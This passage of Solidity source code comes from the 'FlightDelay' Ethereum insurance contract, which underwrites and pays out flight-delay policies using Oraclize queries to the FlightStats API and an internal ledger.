(parts.length - 1);\r\r\r\n        for(uint i = 0; i < parts.length; i++)\r\r\r\n            len += parts[i]._len;\r\r\r\n\r\r\r\n        var ret = new string(len);\r\r\r\n        uint retptr;\r\r\r\n        assembly { retptr := add(ret, 32) }\r\r\r\n\r\r\r\n        for(i = 0; i < parts.length; i++) {\r\r\r\n            memcpy(retptr, parts[i]._ptr, parts[i]._len);\r\r\r\n            retptr += parts[i]._len;\r\r\r\n            if (i < parts.length - 1) {\r\r\r\n                memcpy(retptr, self._ptr, self._len);\r\r\r\n                retptr += self._len;\r\r\r\n            }\r\r\r\n        }\r\r\r\n\r\r\r\n        return ret;\r\r\r\n    }\r\r\r\n}\r\r\r\n\r\r\r\n\r\r\r\n\/**************************************************************************\r\r\r\n * \r\r\r\n *\tContract code starts here. \r\r\r\n * \r\r\r\n **************************************************************************\/\r\r\r\n\r\r\r\n\/*\r\r\r\n\r\r\r\n\tFlightDelay with Oraclized Underwriting and Payout\r\r\r\n\tAll times are UTC.\r\r\r\n\tCopyright (C) Christoph Mussenbrock, Stephan Karpischek\r\r\r\n\t\r\r\r\n*\/\r\r\r\n\r\r\r\ncontract FlightDelay is usingOraclize {\r\r\r\n\r\r\r\n\tusing strings for *;\r\r\r\n\r\r\r\n\tmodifier noEther { if (msg.value > 0) throw; _ }\r\r\r\n\tmodifier onlyOwner { if (msg.sender != owner) throw; _ }\r\r\r\n\tmodifier onlyOraclize {\tif (msg.sender != oraclize_cbAddress()) throw; _ }\r\r\r\n\r\r\r\n\tmodifier onlyInState (uint _policyId, policyState _state) {\r\r\r\n\r\r\r\n\t\tpolicy p = policies[_policyId];\r\r\r\n\t\tif (p.state != _state) throw;\r\r\r\n\t\t_\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\tmodifier onlyCustomer(uint _policyId) {\r\r\r\n\r\r\r\n\t\tpolicy p = policies[_policyId];\r\r\r\n\t\tif (p.customer != msg.sender) throw;\r\r\r\n\t\t_\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\tmodifier notInMaintenance {\r\r\r\n\t\thealthCheck();\r\r\r\n\t\tif (maintenance_mode >= maintenance_Emergency) throw;\r\r\r\n\t\t_\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ the following modifier is always checked at last, so previous modifiers\r\r\r\n\t\/\/ may throw without affecting reentrantGuard\r\r\r\n\tmodifier noReentrant {\r\r\r\n\t\tif (reentrantGuard) throw;\r\r\r\n\t\treentrantGuard = true;\r\r\r\n\t\t_\r\r\r\n\t\treentrantGuard = false;\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ policy Status Codes and meaning:\r\r\r\n\t\/\/\r\r\r\n\t\/\/ 00 = Applied:\tthe customer has payed a premium, but the oracle has\r\r\r\n\t\/\/\t\t\t\t\tnot yet checked and confirmed.\r\r\r\n\t\/\/\t\t\t\t\tThe customer can still revoke the policy.\r\r\r\n\t\/\/ 01 = Accepted:\tthe oracle has checked and confirmed.\r\r\r\n\t\/\/\t\t\t\t\tThe customer can still revoke the policy.\r\r\r\n\t\/\/ 02 = Revoked:\tThe customer has revoked the policy.\r\r\r\n\t\/\/\t\t\t\t\tThe premium minus cancellation fee is payed back to the\r\r\r\n\t\/\/\t\t\t\t\tcustomer by the oracle.\r\r\r\n\t\/\/ 03 = PaidOut:\tThe flight has ended with delay.\r\r\r\n\t\/\/\t\t\t\t\tThe oracle has checked and payed out.\r\r\r\n\t\/\/ 04 = Expired:\tThe flight has endet with <15min. delay.\r\r\r\n\t\/\/\t\t\t\t\tNo payout.\r\r\r\n\t\/\/ 05 = Declined:\tThe application was invalid.\r\r\r\n\t\/\/\t\t\t\t\tThe premium minus cancellation fee is payed back to the\r\r\r\n\t\/\/\t\t\t\t\tcustomer by the oracle.\r\r\r\n\t\/\/ 06 = SendFailed:\tDuring Revoke, Decline or Payout, sending ether failed\r\r\r\n\t\/\/\t\t\t\t\tfor unknown reasons.\r\r\r\n\t\/\/\t\t\t\t\tThe funds remain in the contracts RiskFund.\r\r\r\n\r\r\r\n\r\r\r\n\t\/\/                  00       01        02       03\r\r\r\n\tenum policyState {Applied, Accepted, Revoked, PaidOut,\r\r\r\n\t\/\/\t\t\t\t\t04      05           06\r\r\r\n\t\t\t\t\t  Expired, Declined, SendFailed}\r\r\r\n\r\r\r\n\t\/\/ oraclize callback types:\r\r\r\n\tenum oraclizeState { ForUnderwriting, ForPayout }\r\r\r\n\r\r\r\n\tevent LOG_PolicyApplied(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\taddress customer,\r\r\r\n\t\tstring carrierFlightNumber,\r\r\r\n\t\tuint premium\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyAccepted(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tuint statistics0,\r\r\r\n\t\tuint statistics1,\r\r\r\n\t\tuint statistics2,\r\r\r\n\t\tuint statistics3,\r\r\r\n\t\tuint statistics4,\r\r\r\n\t\tuint statistics5\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyRevoked(\r\r\r\n\t\tuint policyId\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyPaidOut(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tuint amount\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyExpired(\r\r\r\n\t\tuint policyId\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyDeclined(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tbytes32 reason\r\r\r\n\t);\r\r\r\n\tevent LOG_PolicyManualPayout(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tbytes32 reason\r\r\r\n\t);\r\r\r\n\tevent LOG_SendFail(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tbytes32 reason\r\r\r\n\t);\r\r\r\n\tevent LOG_OraclizeCall(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tbytes32 queryId,\r\r\r\n\t\tstring oraclize_url\r\r\r\n\t);\r\r\r\n\tevent LOG_OraclizeCallback(\r\r\r\n\t\tuint policyId,\r\r\r\n\t\tbytes32 queryId,\r\r\r\n\t\tstring result,\r\r\r\n\t\tbytes proof\r\r\r\n\t);\r\r\r\n\tevent LOG_HealthCheck(\r\r\r\n\t\tbytes32 message, \r\r\r\n\t\tint diff,\r\r\r\n\t\tuint balance,\r\r\r\n\t\tint ledgerBalance \r\r\r\n\t);\r\r\r\n\r\r\r\n\t\/\/ some general constants for the system:\r\r\r\n\t\/\/ minimum observations for valid prediction\r\r\r\n\tuint constant minObservations \t\t\t= 10;\r\r\r\n\t\/\/ minimum premium to cover costs\r\r\r\n\tuint constant minPremium \t\t\t\t= 500 finney;\r\r\r\n\t\/\/ maximum premium\r\r\r\n\tuint constant maxPremium \t\t\t\t= 5 ether;\r\r\r\n\t\/\/ maximum payout\r\r\r\n\tuint constant maxPayout \t\t\t\t= 150 ether;\r\r\r\n\t\/\/ maximum cumulated weighted premium per risk\r\r\r\n\tuint maxCumulatedWeightedPremium\t\t= 300 ether; \r\r\r\n\t\/\/ 1 percent for DAO, 1 percent for maintainer\r\r\r\n\tuint8 constant rewardPercent \t\t\t= 2;\r\r\r\n\t\/\/ reserve for tail risks\r\r\r\n\tuint8 constant reservePercent \t\t\t= 1;\r\r\r\n\t\/\/ the weight pattern; in future versions this may become part of the policy struct.\r\r\r\n\t\/\/ currently can't be constant because of compiler restrictions\r\r\r\n\t\/\/ weightPattern[0] is not used, just to be consistent\r\r\r\n    uint8[6] weightPattern \t\t\t\t\t= [0, 10,20,30,50,50];\r\r\r\n\t\/\/ Deadline for acceptance of policies: Mon, 26 Sep 2016 12:00:00 GMT\r\r\r\n\tuint contractDeadline \t\t\t\t\t= 1474891200; \r\r\r\n\r\r\r\n\t\/\/ account numbers for the internal ledger:\r\r\r\n\t\/\/ sum of all Premiums of all currently active policies\r\r\r\n\tuint8 constant acc_Premium \t\t\t\t= 0;\r\r\r\n\t\/\/ Risk fund; serves as reserve for tail risks\r\r\r\n\tuint8 constant acc_RiskFund \t\t\t= 1;\r\r\r\n\t\/\/ sum of all payed out policies\r\r\r\n\tuint8 constant acc_Payout \t\t\t\t= 2;\r\r\r\n\t\/\/ the balance of the contract (negative!!)\r\r\r\n\tuint8 constant acc_Balance \t\t\t\t= 3;\r\r\r\n\t\/\/ the reward account for DAO and maintainer\r\r\r\n\tuint8 constant acc_Reward \t\t\t\t= 4;\r\r\r\n\t\/\/ oraclize costs\r\r\r\n\tuint8 constant acc_OraclizeCosts \t\t= 5;\r\r\r\n\t\/\/ when adding more accounts, remember to increase ledger array length\r\r\r\n\r\r\r\n\t\/\/ Maintenance modes \r\r\r\n\tuint8 constant maintenance_None      \t= 0;\r\r\r\n\tuint8 constant maintenance_BalTooHigh \t= 1;\r\r\r\n\tuint8 constant maintenance_Emergency \t= 255;\r\r\r\n\t\r\r\r\n\t\r\r\r\n\t\/\/ gas Constants for oraclize\r\r\r\n\tuint constant oraclizeGas \t\t\t\t= 500000;\r\r\r\n\r\r\r\n\t\/\/ URLs and query strings for oraclize\r\r\r\n\r\r\r\n\tstring constant oraclize_RatingsBaseUrl =\r\r\r\n\t\t\"[URL] json(https:\/\/api.flightstats.com\/flex\/ratings\/rest\/v1\/json\/flight\/\";\r\r\r\n\tstring constant oraclizeRatingsQuery =\r\r\r\n\t\t\"?${[decrypt] BN0pJDw6e65XSHqRe1zGji\/QU9y5NgK9eTda3VmITxeRgncyGQewbTE+46EFY\/waH5KXoHWSb0d\/Wpwm1rE5SVeA5SvXrSZCKHw13krbK8D\/F\/RqL9\/VoAx8fGJnYsWQ1q2G5lZbiY9sd6sKhozb\/epq4GpcHpdjNf111\/pJTwHttxsrUno\/}).ratings[0]['observations','late15','late30','late45','cancelled','diverted']\";\r\r\r\n\r\r\r\n\t\/\/ [URL] json(https:\/\/api.flightstats.com\/flex\/flightstatus\/rest\/v2\/json\/flight\/status\/LH\/410\/dep\/2016\/09\/01?appId={appId}&appKey={appKey})\r\r\r\n\tstring constant oraclize_StatusBaseUrl =\r\r\r\n\t  \"[URL] json(https:\/\/api.flightstats.com\/flex\/flightstatus\/rest\/v2\/json\/flight\/status\/\";\r\r\r\n\tstring constant oraclizeStatusQuery =\r\r\r\n\t\t\"?${[decrypt] BN0pJDw6e65XSHqRe1zGji\/QU9y5NgK9eTda3VmITxeRgncyGQewbTE+46EFY\/waH5KXoHWSb0d\/Wpwm1rE5SVeA5SvXrSZCKHw13krbK8D\/F\/RqL9\/VoAx8fGJnYsWQ1q2G5lZbiY9sd6sKhozb\/epq4GpcHpdjNf111\/pJTwHttxsrUno\/}&utc=true).flightStatuses[0]['status','delays','operationalTimes']\";\r\r\r\n\r\r\r\n\r\r\r\n\t\/\/ the policy structure: this structure keeps track of the individual parameters of a policy.\r\r\r\n\t\/\/ typically customer address, premium and some status information.\r\r\r\n\r\r\r\n\tstruct policy {\r\r\r\n\r\r\r\n\t\t\/\/ 0 - the customer\r\r\r\n\t\taddress customer;\r\r\r\n\t\t\/\/ 1 - premium\r\r\r\n\t\tuint premium;\r\r\r\n\r\r\r\n\t\t\/\/ risk specific parameters:\r\r\r\n\t\t\/\/ 2 - pointer to the risk in the risks mapping\r\r\r\n\t\tbytes32 riskId;\r\r\r\n\t\t\/\/ custom payout pattern\r\r\r\n\t\t\/\/ in future versions, customer will be able to tamper with this array.\r\r\r\n\t\t\/\/ to keep things simple, we have decided to hard-code the array for all policies.\r\r\r\n\t\t\/\/ uint8[5] pattern;\r\r\r\n\t\t\/\/ 3 - probability weight. this is the central parameter\r\r\r\n\t\tuint weight;\r\r\r\n\t\t\/\/ 4 - calculated Payout\r\r\r\n\t\tuint calculatedPayout;\r\r\r\n\t\t\/\/ 5 - actual Payout\r\r\r\n\t\tuint actualPayout;\r\r\r\n\r\r\r\n\t\t\/\/ status fields:\r\r\r\n\t\t\/\/ 6 - the state of the policy\r\r\r\n\t\tpolicyState state;\r\r\r\n\t\t\/\/ 7 - time of last state change\r\r\r\n\t\tuint stateTime;\r\r\r\n\t\t\/\/ 8 - state change message\/reason\r\r\r\n\t\tbytes32 stateMessage;\r\r\r\n\t\t\/\/ 9 - TLSNotary Proof\r\r\r\n\t\tbytes proof;\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ the risk structure; this structure keeps track of the risk-\r\r\r\n\t\/\/ specific parameters.\r\r\r\n\t\/\/ several policies can share the same risk structure (typically \r\r\r\n\t\/\/ some people flying with the same plane)\r\r\r\n\r\r\r\n\tstruct risk {\r\r\r\n\r\r\r\n\t\t\/\/ 0 - Airline Code + FlightNumber\r\r\r\n\t\tstring carrierFlightNumber;\r\r\r\n\t\t\/\/ 1 - scheduled departure and arrival time in the format \/dep\/YYYY\/MM\/DD\r\r\r\n\t\tstring departureYearMonthDay;\r\r\r\n\t\t\/\/ 2 - the inital arrival time\r\r\r\n\t\tuint arrivalTime;\r\r\r\n\t\t\/\/ 3 - the final delay in minutes\r\r\r\n\t\tuint delayInMinutes;\r\r\r\n\t\t\/\/ 4 - the determined delay category (0-5)\r\r\r\n\t\tuint8 delay;\r\r\r\n\t\t\/\/ 5 - we limit the cumulated weighted premium to avoid cluster risks\r\r\r\n\t\tuint cumulatedWeightedPremium;\r\r\r\n\t\t\/\/ 6 - max cumulated Payout for this risk\r\r\r\n\t\tuint premiumMultiplier;\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ the oraclize callback structure: we use several oraclize calls.\r\r\r\n\t\/\/ all oraclize calls will result in a common callback to __callback(...).\r\r\r\n\t\/\/ to keep track of the different querys we have to introduce this struct.\r\r\r\n\r\r\r\n\tstruct oraclizeCallback {\r\r\r\n\r\r\r\n\t\t\/\/ for which policy have we called?\r\r\r\n\t\tuint policyId;\r\r\r\n\t\t\/\/ for which purpose did we call? {ForUnderwrite | ForPayout}\r\r\r\n\t\toraclizeState oState;\r\r\r\n\t\tuint oraclizeTime;\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\taddress public owner;\r\r\r\n\r\r\r\n\t\/\/ Table of policies\r\r\r\n\tpolicy[] public policies;\r\r\r\n\t\/\/ Lookup policyIds from customer addresses\r\r\r\n\tmapping (address => uint[]) public customerPolicies;\r\r\r\n\t\/\/ Lookup policy Ids from queryIds\r\r\r\n\tmapping (bytes32 => oraclizeCallback) public oraclizeCallbacks;\r\r\r\n\tmapping (bytes32 => risk) public risks;\r\r\r\n\t\/\/ Internal ledger\r\r\r\n\tint[6] public ledger;\r\r\r\n\r\r\r\n\t\/\/ invariant: acc_Premium + acc_RiskFund + acc_Payout\r\r\r\n\t\/\/\t\t\t\t\t\t+ acc_Balance + acc_Reward == 0\r\r\r\n\r\r\r\n\t\/\/ Mutex\r\r\r\n\tbool public reentrantGuard;\r\r\r\n\tuint8 public maintenance_mode;\r\r\r\n\r\r\r\n\tfunction healthCheck() internal {\r\r\r\n\t\tint diff = int(this.balance-msg.value) + ledger[acc_Balance];\r\r\r\n\t\tif (diff == 0) {\r\r\r\n\t\t\treturn; \/\/ everything ok.\r\r\r\n\t\t}\r\r\r\n\t\tif (diff > 0) {\r\r\r\n\t\t\tLOG_HealthCheck('Balance too high', diff, this.balance, ledger[acc_Balance]);\r\r\r\n\t\t\tmaintenance_mode = maintenance_BalTooHigh;\r\r\r\n\t\t} else {\r\r\r\n\t\t\tLOG_HealthCheck('Balance too low', diff, this.balance, ledger[acc_Balance]);\r\r\r\n\t\t\tmaintenance_mode = maintenance_Emergency;\r\r\r\n\t\t}\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ manually perform healthcheck.\r\r\r\n\t\/\/ @param _maintenance_mode: \r\r\r\n\t\/\/ \t\t0 = reset maintenance_mode, even in emergency\r\r\r\n\t\/\/ \t\t1 = perform health check\r\r\r\n\t\/\/    255 = set maintenance_mode to maintenance_emergency (no newPolicy anymore)\r\r\r\n\tfunction performHealthCheck(uint8 _maintenance_mode) onlyOwner {\r\r\r\n\t\tmaintenance_mode = _maintenance_mode;\r\r\r\n\t\tif (maintenance_mode > 0 && maintenance_mode < maintenance_Emergency) {\r\r\r\n\t\t\thealthCheck();\r\r\r\n\t\t}\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction payReward() onlyOwner {\r\r\r\n\r\r\r\n\t\tif (!owner.send(this.balance)) throw;\r\r\r\n\t\tmaintenance_mode = maintenance_Emergency; \/\/ don't accept any policies\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction bookkeeping(uint8 _from, uint8 _to, uint _amount) internal {\r\r\r\n\r\r\r\n\t\tledger[_from] -= int(_amount);\r\r\r\n\t\tledger[_to] += int(_amount);\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ if ledger gets corrupt for unknown reasons, have a way to correct it:\r\r\r\n\tfunction audit(uint8 _from, uint8 _to, uint _amount) onlyOwner {\r\r\r\n\r\r\r\n\t\tbookkeeping (_from, _to, _amount);\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction getPolicyCount(address _customer)\r\r\r\n\t\tconstant returns (uint _count) {\r\r\r\n\t\treturn policies.length;\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction getCustomerPolicyCount(address _customer)\r\r\r\n\t\tconstant returns (uint _count) {\r\r\r\n\t\treturn customerPolicies[_customer].length;\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction bookAndCalcRemainingPremium() internal returns (uint) {\r\r\r\n\r\r\r\n\t\tuint v = msg.value;\r\r\r\n\t\tuint reserve = v * reservePercent \/ 100;\r\r\r\n\t\tuint remain = v - reserve;\r\r\r\n\t\tuint reward = remain * rewardPercent \/ 100;\r\r\r\n\r\r\r\n\t\tbookkeeping(acc_Balance, acc_Premium, v);\r\r\r\n\t\tbookkeeping(acc_Premium, acc_RiskFund, reserve);\r\r\r\n\t\tbookkeeping(acc_Premium, acc_Reward, reward);\r\r\r\n\r\r\r\n\t\treturn (uint(remain - reward));\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ constructor\r\r\r\n\tfunction FlightDelay (address _owner) {\r\r\r\n\r\r\r\n\t\towner = _owner;\r\r\r\n\t\treentrantGuard = false;\r\r\r\n\t\tmaintenance_mode = maintenance_None;\r\r\r\n\r\r\r\n\t\t\/\/ initially put all funds in risk fund.\r\r\r\n\t\tbookkeeping(acc_Balance, acc_RiskFund, msg.value);\r\r\r\n\t\toraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\r\r\r\n\r\r\r\n\t}\r\r\r\n\r\r\r\n\t\/\/ fix issue with _departureYMD\r\r\r\n    function toYMD (uint departure) returns (string) {\r\r\r\n        uint diff = (departure - 1472601600) \/ 86400;\r\r\r\n        uint8 d1 = uint8(diff \/ 10);\r\r\r\n        uint8 d2 = uint8(diff - 10*d1);\r\r\r\n        string memory str = '\/dep\/2016\/09\/xx';\r\r\r\n        bytes memory strb = bytes(str);\r\r\r\n        strb[13] = bytes1(d1+48);\r\r\r\n        strb[14] = bytes1(d2+48);\r\r\r\n\t\treturn(string(strb));\r\r\r\n    }\r\r\r\n\r\r\r\n\r\r\r\n\t\/\/ create new policy\r\r\r\n\tfunction newPolicy(\r\r\r\n\t\tstring _carrierFlightNumber, \r\r\r\n\t\tstring _departureYearMonthDay, \r\r\r\n\t\tuint _departureTime, \r\r\r\n\t\tuint _arrivalTime\r\r\r\n\t\t) \r\r\r\n\t\tnotInMaintenance {\r\r\r\n\r\r\r\n\t\t_departureYearMonthDay = toYMD(_departureTime);\r\r\r\n\t\t\/\/ sanity checks:\r\r\r\n\r\r\r\n\t\t\/\/ don't accept too low or too high policies\r\r\r\n\r\r\r\n\t\tif (msg.value < minPremium || msg.value > maxPremium) {\r\r\r\n\t\t\tLOG_PolicyDeclined(0, 'Invalid premium value');\r\r\r\n\t\t\tif (!msg.sender.send(msg.value)) {\r\r\r\n\t\t\t\tLOG_SendFail(0, 'newPolicy sendback failed (1)');\r\r\r\n\t\t\t}\r\r\r\n\t\t\treturn;\r\r\r\n\t\t}\r\r\r\n\r\r\r\n        \/\/ don't accept flights with departure time earlier than in 24 hours, \r\r\r\n\t\t\/\/ or arrivalTime before departureTime, \r\r\r\n\t\t\/\/ or departureTime after Mon, 26 Sep 2016 12:00:00 GMT\r\r\r\n        if (\r\r\r\n\t\t\t_arrivalTime < _departureTime ||\r\r\r\n\t\t\t_arrivalTime > _departureTime + 2 days ||\r\r\r\n\t\t\t_departureTime < now + 24 hours ||\r\r\r\n\t\t\t_departureTime > contractDeadline) {\r\r\r\n\t\t\tLOG_PolicyDeclined(0, 'Invalid arrival\/departure time');\r\r\r\n\t\t\tif (!msg.sender.send(msg.value)) {\r\r\r\n\t\t\t\tLOG_SendFail(0, 'newPolicy sendback failed (2)');\r\r\r\n\t\t\t}\r\r\r\n\t\t\treturn;\r\r\r\n        }\r\r\r\n\t\t\r\r\r\n\t\t\/\/ accept only a number of maxIdenticalRisks identical risks:\r\r\r\n\t\t\r\r\r\n\t\tbytes32 riskId = sha3(\r\r\r\n\t\t\t_carrierFlightNumber, \r\r\r\n\t\t\t_departureYearMonthDay, \r\r\r\n\t\t\t_arrivalTime\r\r\r\n\t\t);\r\r\r\n\t\trisk r = risks[riskId];\r\r\r\n\t\r\r\r\n\t\t\/\/ roughly check, whether maxCumulatedWeightedPremium will be exceeded\r\r\r\n\t\t\/\/ (we accept the inaccuracy that the real remaining premium is 3% lower), \r\r\r\n\t\t\/\/ but we are conservative;\r\r\r\n\t\t\/\/ if this is the first policy, the left side will be 0\r\r\r\n\t\tif (msg.value * r.premiumMultiplier + r.cumulatedWeightedPremium >= \r\r\r\n\t\t\tmaxCumulatedWeightedPremium) {\r\r\r\n\t\t\tLOG_PolicyDeclined(0, 'Cluster risk');\r\r\r\n\t\t\tif (!msg.sender.send(msg.value)) {\r\r\r\n\t\t\t\tLOG_SendFail(0, 'newPolicy sendback failed (3)');\r\r\r\n\t\t\t}\r\r\r\n\t\t\treturn;\r\r\r\n\t\t} else if (r.cumulatedWeightedPremium == 0) {\r\r\r\n\t\t\t\/\/ at the first police, we set r.cumulatedWeightedPremium to the max.\r\r\r\n\t\t\t\/\/ this prevents further polices to be accepted, until the correct\r\r\r\n\t\t\t\/\/ value is calculated after the first callback from the oracle.\r\r\r\n\t\t\tr.cumulatedWeightedPremium = maxCumulatedWeightedPremium;\r\r\r\n\t\t}\r\r\r\n\r\r\r\n\t\t\/\/ store or update policy\r\r\r\n\t\tuint policyId = policies.length++;\r\r\r\n\t\tcustomerPolicies[msg.sender].push(policyId);\r\r\r\n\t\tpolicy p = policies[policyId];\r\r\r\n\r\r\r\n\t\tp.customer = msg.sender;\r\r\r\n\t\t\/\/ the remaining premium after deducting reserve and reward\r\r\r\n\t\tp.premium = bookAndCalcRemainingPremium();\r\r\r\n\t\tp.riskId = riskId;\r\r\r\n\r\r\r\n\t\t\/\/ store risk parameters\r\r\r\n\t\t\/\/ Airline Code\r\r\r\n\t\tif (r.premiumMultiplier == 0) { \/\/ then it is the first call.\r\r\r\n\t\t\t\/\/ we have a new struct\r\r\r\n\t\t\tr.carrierFlightNumber = _carrierFlightNumber;\r\r\r\n\t\t\tr.departureYearMonthDay = _departureYearMonthDay;\r\r\r\n\t\t\tr.arrivalTime = _arrivalTime;\r\r\r\n\t\t} else { \/\/ we cumulate the risk\r\r\r\n\t\t\tr.cumulatedWeightedPremium += p.premium * r.premiumMultiplier;\r\r\r\n\t\t}\r\r\r\n\r\r\r\n\t\t\/\/ now we have successfully applied\r\r\r\n\t\tp.state = policyState.Applied;\r\r\r\n\t\tp.stateMessage = 'Policy applied by customer';\r\r\r\n\t\tp.stateTime = now;\r\r\r\n\t\tLOG_PolicyApplied(policyId, msg.sender, _carrierFlightNumber, p.premium);\r\r\r\n\r\r\r\n\t\t\/\/ call oraclize to get Flight Stats; this will also call underwrite()\r\r\r\n\t\tgetFlightStats(policyId, _carrierFlightNumber);\r\r\r\n\t}\r\r\r\n\t\r\r\r\n\tfunction underwrite(uint _policyId, uint[6] _statistics, bytes _proof) internal {\r\r\r\n\r\r\r\n\t\tpolicy p = policies[_policyId]; \/\/ throws if _policyId invalid\r\r\r\n\t\tuint weight;\r\r\r\n\t\tfor (uint8 i = 1; i <= 5; i++ ) {\r\r\r\n\t\t\tweight += weightPattern[i] * _statistics[i];\r\r\r\n\t\t\t\/\/ 1% = 100 \/ 100% = 10,000\r\r\r\n\t\t}\r\r\r\n\t\t\/\/ to avoid div0 in the payout section, \r\r\r\n\t\t\/\/ we have to make a minimal assumption on p.weight.\r\r\r\n\t\tif (weight == 0) { weight = 100000 \/ _statistics[0]; }\r\r\r\n\r\r\r\n\t\trisk r = risks[p.riskId];\r\r\r\n\t\t\/\/ we calculate the factors to limit cluster risks.\r\r\r\n\t\tif (r.premiumMultiplier == 0) { \r\r\r\n\t\t\t\/\/ it's the first call, we accept any premium\r\r\r\n\t\t\tr.premiumMultiplier = 100000 \/ weight;\r\r\r\n\t\t\tr.cumulatedWeightedPremium = p.premium * 100000 \/ weight;\r\r\r\n\t\t}\r\r\r\n\t\t\r\r\r\n\t\tp.proof = _proof;\r\r\r\n\t\tp.weight = weight;\r\r\r\n\r\r\r\n\t\t\/\/ schedule payout Oracle\r\r\r\n\t\tschedulePayoutOraclizeCall(\r\r\r\n\t\t\t_policyId, \r\r\r\n\t\t\tr.carrierFlightNumber, \r\r\r\n\t\t\tr.departureYearMonthDay, \r\r\r\n\t\t\tr.arrivalTime + 15 minutes\r\r\r\n\t\t);\r\r\r\n\r\r\r\n\t\tp.state = policyState.Accepted;\r\r\r\n\t\tp.stateMessage = 'Policy underwritten by oracle';\r\r\r\n\t\tp.stateTime = now;\r\r\r\n\r\r\r\n\t\tLOG_PolicyAccepted(\r\r\r\n\t\t\t_policyId, \r\r\r\n\t\t\t_statistics[0], \r\r\r\n\t\t\t_statistics[1], \r\r\r\n\t\t\t_statistics[2], \r\r\r\n\t\t\t_statistics[3], \r\r\r\n\t\t\t_statistics[4],\r\r\r\n\t\t\t_statistics[5]\r\r\r\n\t\t);\r\r\r\n\r\r\r\n\t}\r\r\r\n\t\r\r\r\n\tfunction decline(uint _policyId, bytes32 _reason, bytes _proof)\tinternal {\r\r\r\n\r\r\r\n\t\tpolicy p = policies[_policyId];\r\r\r\n\r\r\r\n\t\tp.state = policyState.Declined;\r\r\r\n\t\tp.stateMessage = _reason;\r\r\r\n\t\tp.stateTime = now; \/\/ won't be reverted in case of errors\r\r\r\n\t\tp.proof = _proof;\r\r\r\n\t\tbookkeeping(acc_Premium, acc_Balance, p.premium);\r\r\r\n\r\r\r\n\t\tif (!p.customer.send(p.premium))  {\r\r\r\n\t\t\tbookkeeping(acc_Balance, acc_RiskFund, p.premium);\r\r\r\n\t\t\tp.state = policyState.SendFailed;\r\r\r\n\t\t\tp.stateMessage = 'decline: Send failed.';\r\r\r\n\t\t\tLOG_SendFail(_policyId, 'decline sendfail');\r\r\r\n\t\t}\r\r\r\n\t\telse {\r\r\r\n\t\t\tLOG_PolicyDeclined(_policyId, _reason);\r\r\r\n\t\t}\r\r\r\n\r\r\r\n\r\r\r\n\t}\r\r\r\n\t\r\r\r\n\tfunction schedulePayoutOraclizeCall(\r\r\r\n\t\tuint _policyId, \r\r\r\n\t\tstring _carrierFlightNumber, \r\r\r\n\t\tstring _departureYearMonthDay, \r\r\r\n\t\tuint _oraclizeTime) \r\r\r\n\t\tinternal {\r\r\r\n\r\r\r\n\t\tstring memory oraclize_url = strConcat(\r\r\r\n\t\t\toraclize_StatusBaseUrl,\r\r\r\n\t\t\t_carrierFlightNumber,\r\r\r\n\t\t\t_departureYearMonthDay,\r\r\r\n\t\t\toraclizeStatusQuery\r\r\r\n\t\t\t);\r\r\r\n\r\r\r\n\t\tbytes32 queryId = oraclize_query(_oraclizeTime, 'nested', oraclize_url, oraclizeGas);\r\r\r\n\t\tbookkeeping(acc_OraclizeCosts, acc_Balance, uint((-ledger[acc_Balance]) - int(this.balance)));\r\r\r\n\t\toraclizeCallbacks[queryId] = oraclizeCallback(_policyId, oraclizeState.ForPayout, _oraclizeTime);\r\r\r\n\r\r\r\n\t\tLOG_OraclizeCall(_policyId, queryId, oraclize_url);\r\r\r\n\t}\r\r\r\n\r\r\r\n\tfunction payOut(uint _policyId, uint8 _delay, uint _delayInMinutes)\r\r\r\n\t\tnotInMaintenance\r\r\r\n\t\tonlyOraclize\r\r\r\n\t\tonlyInState(_policyId, policyState.Accepted)\r\r\r\n\t\tinternal {\r\r\r\n\r\r\r\n\t\tpolicy p = policies[_policyId];\r\r\r\n\t\trisk r = risks[p.riskId];\r\r\r\n\t\tr.delay = _delay;\r\r\r\n\t\tr.delayInMinutes = _delayInMinutes;\r\r\r\n\t\t\r\r\r\n\t\tif (_delay == 0) {\r\r\r\n\t\t\tp.state = policyState.Expired;\r\r\r\n\t\t\tp.stateMessage = 'Expired - no delay!';\r\r\r\n\t\t\tp.stateTime = now;\r\r\r\n\t\t\tLOG_PolicyExpired(_policyId);\r\r\r\n\t\t} else {\r\r\r\n\r\r\r\n\t\t\tuint payout = p.premium * weightPattern[_delay] * 10000 \/ p.weight;\r\r\r\n\t\t\tp.calculatedPayout = payout;\r\r\r\n\r\r\r\n\t\t\tif (payout > maxPayout) {\r\r\r\n\t\t\t\tpayout = maxPayout;\r\r\r\n\t\t\t}\r\r\r\n\r\r\r\n\t\t\tif (payout > uint(-ledger[acc_Balance])) { \/\/ don't go for chapter 11\r\r\r\n\t\t\t\tpayout = uint(-ledger[acc_Balance]);\r\r\r\n\t\t\t}\r\r\r\n\r\r\r\n\t\t\tp.actualPayout = payout;\r\r\r\n\t\t\tbookkeeping(acc_Payout, acc_Balance, 